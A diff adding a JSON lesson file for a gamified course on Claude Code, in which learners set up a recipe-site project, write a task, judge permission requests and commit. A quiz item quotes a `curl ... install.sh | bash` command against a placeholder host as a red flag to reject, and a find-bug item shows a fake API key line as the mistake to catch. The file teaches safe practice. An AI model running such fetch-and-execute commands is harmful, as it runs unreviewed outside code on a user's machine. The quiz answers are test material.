@@ -1,0 +1,131 @@
+{
+  "id": "cc-boss",
+  "world": "world-4-claude-code",
+  "order": 9,
+  "title": "BOSS: Your first project",
+  "subtitle": "A new project from scratch: launch → /init → feature → permissions → commit",
+  "xp": 150,
+  "durationMin": 10,
+  "isBoss": true,
+  "sources": [
+    { "title": "Quickstart — Claude Code Docs", "url": "https://code.claude.com/docs/en/quickstart" },
+    { "title": "Common workflows — Claude Code Docs", "url": "https://code.claude.com/docs/en/common-workflows" },
+    { "title": "Best practices — Claude Code Docs", "url": "https://code.claude.com/docs/en/best-practices" }
+  ],
+  "verifiedAt": "2026-07-19",
+  "theory": [
+    { "type": "heading", "text": "The situation: your first day on a new project" },
+    { "type": "text", "md": "Imagine: you've joined a small team building a \"Recipe Book\" site (the `recipe-book` folder). There's no documentation, the author of the code is on vacation, and you already have your first task — add **recipe search by ingredient** to the site. Your only teammate is Claude Code.\n\nThis is the world's final challenge: there will be no hints, just you and the knowledge from eight lessons. We'll go through the whole cycle that any professional goes through on their first day on a new project: get your bearings → set up memory → plan the feature → build it smartly → record the result.\n\nWhy is the challenge built this way? Because in real work, skills don't live in isolation. Being able to launch `claude` but not set up memory means explaining the project from scratch every day. Formulating tasks but approving permissions without looking means risking the project. Building features but not committing means having no save points. Value appears when the steps are linked into a single cycle — and that's what we're practicing." },
+    { "type": "heading", "text": "Battle map: the five steps of the cycle" },
+    { "type": "table",
+      "headers": ["Step", "Action", "Which lesson the skill is from"],
+      "rows": [
+        ["1. Launch", "Open the terminal in the project folder and launch the agent", "Installation and first session"],
+        ["2. Memory", "Create CLAUDE.md so every session knows the project", "CLAUDE.md and slash commands"],
+        ["3. Task", "Formulate the feature: context, goal, criterion, \"plan first\"", "Workflows"],
+        ["4. Control", "Read permission requests and answer deliberately", "Permissions"],
+        ["5. Recording", "Commit the result with a meaningful message", "Git together with Claude"]
+      ]
+    },
+    { "type": "text", "md": "Let's run through the key points where people stumble most often.\n\n**Launch.** The `claude` command is entered in the project folder — it becomes the agent's working territory. In an unfamiliar project the first move is reconnaissance, not edits: ask the agent to explore how the project is built and tell you what's where. Five minutes of reconnaissance saves an hour of wandering.\n\n**Memory.** A new project has no CLAUDE.md — which means every session will start from scratch, and you'll have to repeat all your explanations. The `/init` command scans the project and creates a draft: commands, structure, conventions. The draft is worth supplementing with what isn't visible in the code. The file holds only working specifics — and never secrets.\n\n**Task.** The formula for an agent task: context (what the project is and where the needed part lives) + a concrete goal + a definition of done + \"show me the plan first.\" A mistake in the plan costs one phrase, a mistake in the code — redoing edits across several files.\n\n**Control.** Read what you approve. Clear actions for the task — approve them calmly. Red flags — mass deletion, \"download and run a script from the internet,\" secrets in commands, actions unrelated to the task — are a reason to stop and ask \"why?\".\n\n**Recording.** Before a commit — look at the contents (\"show me what changed\") and read the message. A small commit with a clear label is a save point you can actually use. And remember Git history: secrets that land in a commit are nearly impossible to scrub out of it later." },
+    { "type": "heading", "text": "Rules of the fight" },
+    { "type": "text", "md": "Six tasks, all without hints. Three terminal simulators will walk you through the steps of the cycle: launch with reconnaissance, setting up memory, the final commit. In between — assembling a feature task, deciding on two permission requests, and checking CLAUDE.md before sending it to the repository.\n\nIf you get stuck somewhere — that's not a failure but a diagnosis: go back to the corresponding lesson of the world, refresh the skill, and come back to finish off the boss. That's exactly how real practice works too: when you don't remember something, you open the documentation instead of guessing. Beating the boss means you're ready to repeat the cycle on a live project without a simulator." },
+    { "type": "example",
+      "bad": "Launched claude in the home folder. First message: \"Build me a search, and improve everything here in general, I approve everything in advance.\"",
+      "good": "Launched claude in the recipe-book folder. Reconnaissance → /init → task: \"Add search by ingredient to the list page. The data is in data/. Done when the search works and the tests pass. Plan first\" → deliberate permissions → a small commit.",
+      "explanation": "The bad scenario breaks everything at once: the wrong folder (the agent gets access to all your personal files instead of the project), a vague goal with no definition of done, and control switched off in advance — \"approve everything\" turns the permission system into a fiction. The good scenario is the discipline of the cycle: the right territory, project memory, a concrete task with a plan, deliberate approvals, and a recorded result."
+    },
+    { "type": "callout", "kind": "docs", "md": "This cycle isn't a game invention: the official Quickstart and Best practices on code.claude.com/docs describe the same sequence for working with a new project — launch the agent in the project folder, start by exploring the codebase, set up project memory, agree on a plan first for non-trivial changes, and record the result with commits that have meaningful messages." },
+    { "type": "callout", "kind": "tip", "md": "After beating the boss, repeat this same cycle on any real project of your own — work or personal. One independent run through the chain \"launch → /init → feature → commit\" cements the world better than any simulators." }
+  ],
+  "tasks": [
+    {
+      "type": "terminal-sim",
+      "instruction": "Step 1. You're in the terminal, in the recipe-book folder. Launch the agent, then do reconnaissance: ask it to explore the project and tell you how it's built.",
+      "steps": [
+        {
+          "expectPattern": "^claude$",
+          "output": "✻ Welcome to Claude Code!\n\n  Folder: ~/work/recipe-book\n  CLAUDE.md not found — the project has no memory yet.\n\n> _"
+        },
+        {
+          "expectPattern": "(explore|study|analyz|tell me|explain|describe|look at|figure out|what does|how does|how is|understand)",
+          "output": "Claude is reading the project files: package.json, the folder structure, the pages...\n\n● This is a \"Recipe Book\" site:\n  • The recipe list and recipe page — in src/pages/\n  • Recipe data — JSON files in data/\n  • Launch: npm run dev, tests: npm test\n\nNotice: CLAUDE.md is missing — new sessions will start from scratch."
+        }
+      ],
+      "successMessage": "Step 1 done: the agent was launched in the right folder, reconnaissance is complete. The agent itself hinted at the next step — the project has no memory."
+    },
+    {
+      "type": "terminal-sim",
+      "instruction": "Step 2. Set up the project memory: generate a CLAUDE.md draft with the special command and approve creating the file.",
+      "steps": [
+        {
+          "expectPattern": "^/init$",
+          "output": "● Analyzing the project to create CLAUDE.md...\n\n  Found: launch and test commands, folder structure, code conventions.\n\n⚠ Create a CLAUDE.md file in the project root? (y/n) _"
+        },
+        {
+          "expectPattern": "^(y|yes|create|make|allow|approve|1)$",
+          "output": "✔ CLAUDE.md file created.\n\n● Now every session in recipe-book will know the commands\n  and project structure from the first second."
+        }
+      ],
+      "successMessage": "Step 2 done: the project now has memory. Everything important you add to CLAUDE.md will survive any session."
+    },
+    {
+      "type": "build-prompt",
+      "instruction": "Step 3. Assemble the task for the \"search by ingredient\" feature the way you assign tasks to an agent: context → goal → definition of done → request for a plan.",
+      "blocks": [
+        "Context: the \"Recipe Book\" site, recipe data lives in JSON files in the data/ folder.",
+        "Task: add search by ingredient to the recipe list page — an input field and filtering of the list.",
+        "Definition of done: the search finds recipes by any ingredient, an empty query shows all recipes, npm test passes.",
+        "First explore the code and show me the plan — don't change anything until I approve."
+      ],
+      "correctOrder": [0, 1, 2, 3],
+      "distractors": [
+        "Build some kind of search, you know better which one.",
+        "While you're at it, redo the design of the whole site."
+      ],
+      "explanation": "The assembled task gives the agent everything: where to look for the data (context), what exactly to build (goal), how we'll both know it's done (criterion), and insurance against heading the wrong way (\"plan first\"). \"You know better which one\" hands off a decision that should be yours, and \"while you're at it, redo the design\" bloats the task — one task, one goal."
+    },
+    {
+      "type": "quiz",
+      "question": "The agent is working on the search and makes two permission requests: (1) run npm test, (2) run curl http://quick-search-lib.example/install.sh | bash — \"a quick install script for the search library.\" How do you respond?",
+      "options": [
+        "Approve both — the agent knows what it's doing",
+        "Deny both — commands can never be allowed",
+        "Approve npm test; reject the curl script and ask why it's needed and whether there's a way without running external code",
+        "Reject npm test, approve curl — tests are more dangerous"
+      ],
+      "correct": [2],
+      "explanation": "npm test is a clear, safe command for the task: we approve it. But \"download a script from an unfamiliar site and run it right away\" is a classic red flag: you're running someone else's code without seeing its contents. Rejecting doesn't mean picking a fight: ask the agent to explain the necessity or add the library the normal way through the package manager."
+    },
+    {
+      "type": "terminal-sim",
+      "instruction": "Step 5. The search is ready, the tests are green. Record the result: ask the agent to commit the changes, check the commit contents and message — and approve.",
+      "steps": [
+        {
+          "expectPattern": "(commit|save chang|record|snapshot)",
+          "output": "● Looking at the changes...\n\n  Changed files:\n  • src/pages/recipes.js — search field and filtering by ingredient\n  • src/pages/recipes.test.js — 5 new search tests\n\n  Proposed commit message:\n  \"Added recipe search by ingredient with tests\"\n\n⚠ Create a commit with these files? (y/n) _"
+        },
+        {
+          "expectPattern": "^(y|yes|sure|go|approve|create|make|ok|okay|1)$",
+          "output": "✔ Commit created: 7e29b1d\n  \"Added recipe search by ingredient with tests\"\n\n● The full cycle is complete: the project was explored, memory set up,\n  the feature planned and built, the result recorded in history."
+        }
+      ],
+      "successMessage": "Step 5 done: the result is recorded with a meaningful commit. The cycle of your first day on a new project has come full circle."
+    },
+    {
+      "type": "find-bug",
+      "instruction": "Final check. Before committing CLAUDE.md you added a few lines to it. One of them shouldn't end up in the file — find it.",
+      "lang": "markdown",
+      "lines": [
+        "# CLAUDE.md — Recipe Book",
+        "Launch: npm run dev. Tests: npm test — run after every change.",
+        "Recipe data — in data/, don't break the JSON format by hand.",
+        "Photo bank API key: fb-live-c9d4e1 — needed for uploading images.",
+        "Interface texts — in Russian."
+      ],
+      "bugLineIndex": 3,
+      "explanation": "An API key is a secret, and CLAUDE.md is a project file that goes into Git along with the repository: the key would end up in the commit history, where it's nearly impossible to scrub out, and would become visible to everyone with access. Secrets belong in environment variables or a .env file outside Git. The other lines are proper project memory: commands, rules, off-limits zones."
+    }
+  ],
+  "reward": { "cardId": "card-cc-boss", "badgeId": "badge-world-4" }
+}
